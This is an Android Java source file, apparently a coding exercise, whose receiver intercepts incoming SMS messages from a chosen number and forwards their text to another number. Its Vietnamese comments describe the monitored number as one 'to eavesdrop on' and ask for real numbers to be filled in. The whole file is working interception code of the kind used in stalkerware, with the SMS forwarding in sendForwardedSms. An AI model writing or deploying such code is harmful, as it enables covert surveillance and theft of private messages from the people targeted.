package com.example.bai10;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;
import android.telephony.SmsManager;

public class MySmsReceive extends BroadcastReceiver {
    private static final String TARGET_NUMBER = "+1234567890"; // Số điện thoại nhận chuyển tiếp, thay bằng số thực tế
    private static final String MONITOR_NUMBER = "+0987654321"; // Số cần nghe lén, thay bằng số thực tế

    @Override
    public void onReceive(Context context, Intent intent) {
        processReceive(context, intent);
    }

    public void processReceive(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        String message = "";
        String body = "";
        String address = "";

        if (extras != null) {
            Object[] smsExtras = (Object[]) extras.get("pdus");
            for (int i = 0; i < smsExtras.length; i++) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) smsExtras[i]);
                body = sms.getMessageBody();
                address = sms.getOriginatingAddress();

                // Kiểm tra số gửi đến
                if (address != null && address.equals(MONITOR_NUMBER)) {
                    message += "Có 1 tin nhắn từ " + address + "\n" + body + " vừa gửi đến";

                    // Hiển thị Toast
                    Toast.makeText(context, message, Toast.LENGTH_LONG).show();

                    // Chuyển tiếp tin nhắn
                    sendForwardedSms(context, TARGET_NUMBER, body);
                }
            }
        }
    }

    private void sendForwardedSms(Context context, String targetNumber, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(targetNumber, null, message, null, null);
        } catch (Exception e) {
            Toast.makeText(context, "Lỗi khi chuyển tiếp: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
}